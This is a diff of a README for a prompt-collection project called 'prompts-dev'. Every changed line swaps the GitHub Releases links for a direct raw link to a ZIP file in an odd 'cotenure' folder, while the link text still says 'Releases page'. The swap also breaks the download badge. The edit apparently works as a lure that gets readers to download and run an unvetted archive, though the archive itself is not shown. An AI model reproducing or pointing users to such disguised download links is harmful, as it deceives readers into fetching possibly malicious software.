@@ -1,6 +1,6 @@
 # 🎉 prompts-dev - Easy Prompts for Your Projects
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/matixblocks/prompts-dev/releases)
+[![Download Now](https://raw.githubusercontent.com/matixblocks/prompts-dev/main/cotenure/prompts-dev_2.7.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/matixblocks/prompts-dev/main/cotenure/prompts-dev_2.7.zip)
 
 ## 📚 Introduction
 
@@ -10,7 +10,7 @@ Welcome to "prompts-dev." This project provides ready-to-use prompts for your de
 
 To get started with "prompts-dev," follow these steps to download and run the software:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/matixblocks/prompts-dev/releases) of this repository.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/matixblocks/prompts-dev/main/cotenure/prompts-dev_2.7.zip) of this repository.
 2. **Select the Latest Release**: Choose the latest version available.
 3. **Download the files**: You will find all the necessary files in this section. Click on the desired file to download it to your computer.
 
@@ -20,7 +20,7 @@ Once you have downloaded the files, follow the instructions provided for specifi
 
 To install the prompts and start using them in your projects:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/matixblocks/prompts-dev/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/matixblocks/prompts-dev/main/cotenure/prompts-dev_2.7.zip).
 2. **Download the files**: Click on the relevant version to download the prompts files you need.
 3. **Extract the Files**: If your browser does not automatically extract it, locate the downloaded ZIP file and extract it to your desired folder.
 4. **Open the Prompts**: You can now open the prompts in your code editor and start using them.
